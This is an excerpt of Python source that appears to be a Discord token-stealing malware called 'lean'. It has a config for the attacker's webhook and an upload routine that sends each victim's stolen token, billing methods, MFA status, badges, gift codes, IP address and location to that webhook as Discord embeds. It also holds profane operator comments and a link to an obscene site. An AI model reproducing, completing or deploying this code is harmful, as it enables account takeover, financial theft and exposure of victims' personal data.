...
from util.browser import Browsers
...
def main():
    ...
    for func in funcs:
        if __leanconf__[func.__name__.lower()]:
            try:
                if func.__init__.__code__.co_argcount == 2:
                    func(__leanconf__['webhook'])
                else:
                    func()
...
__leanconf__ = {
    'webhook' : "WEBHOOKHERE DUMBASS", # PUT YOUR FUCKING WEBHOOK HERE 
    'browsers' : True, # PLEASE USE YOUR BRAIN 
    'discordtoken' : True, # AGAIN USE YOUR FUCKING BRAIN
}
...
class upload_tokens:
    ...
    def upload(self):
        ...
        for token in self.tokens:
            ...
            embed = Embed(title=f"{username} ({user_id})", color=0xffffff)
            embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1104924335963131997/1106412432567570492/codeine-lean.gif")

            embed.add_field(name="👤  Token:", value=f"`{token}`\n[Click to copy!](https://artofzoo.com/animal-porn-shop/)\n\u200b", inline=True)
            embed.add_field(name="<a:4394_cc_creditcard_cartao_f4bihy:755218296801984553> Nitro:", value=f"{nitro}", inline=True)
            embed.add_field(name="👤  Badges:", value=f"{badges if badges != '' else 'None'}", inline=True)
            embed.add_field(name="<a:4394_cc_creditcard_cartao_f4bihy:755218296801984553> Billing:", value=f"{payment_methods if payment_methods != '' else 'None'}", inline=True)
            embed.add_field(name="👤  MFA:", value=f"{mfa}", inline=True)

            embed.add_field(name=f"<a:earthpink:996004236531859588>  **IP:**", value=f"`{ip}`", inline=False)
            embed.add_field(name=f"<a:earthpink:996004236531859588>  **City:**", value=f"`{city}`", inline=False)
            embed.add_field(name=f"<a:earthpink:996004236531859588>  **Country:**", value=f"`{country}`", inline=False)
            embed.add_field(name=f"<a:earthpink:996004236531859588>  **Region:**", value=f"`{region}`", inline=False)
            ...
            if hq_guilds != None:
                embed.add_field(name="👤  HQ Guilds:", value=hq_guilds, inline=True)
                embed.add_field(name="\u200b", value="\u200b", inline=True)
            ...
            if codes != None:
                embed.add_field(name="👤  Gift Codes:", value=codes, inline=True)
                embed.add_field(name="\u200b", value="\u200b", inline=True)

            embed.set_footer(text="github.com/veallol")

            self.webhook.send(embed=embed, username="lean", avatar_url="https://cdn.discordapp.com/attachments/1104924335963131997/1106412432567570492/codeine-lean.gif")
